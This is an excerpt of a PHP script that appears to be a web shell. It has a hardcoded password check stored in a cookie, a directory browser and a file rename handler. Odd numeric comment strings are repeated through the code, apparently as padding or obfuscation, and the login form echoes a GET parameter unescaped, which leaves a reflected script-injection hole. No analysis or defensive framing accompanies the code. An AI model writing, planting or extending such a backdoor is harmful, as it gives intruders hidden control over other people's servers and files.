...
$auth_key = "57df7820a8be67f1b8ed64c8ed98701e";
...
$pass = false;
if (isset($_COOKIE['pw_name_99117'])) {
    if(($_COOKIE['pw_name_99117']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_99117'])) {
        if(($_POST['pw_name_99117']) == $auth_key) {
            setcookie("pw_name_99117", $_POST['pw_name_99117']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_99117' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725875439693434 1725875439284710 1725875439165466 1725875439104420
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725875439693434 1725875439284710 1725875439165466 1725875439104420
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725875439693434 1725875439284710 1725875439165466 1725875439104420
            $name = PATH . "/" . $_GET['r'];
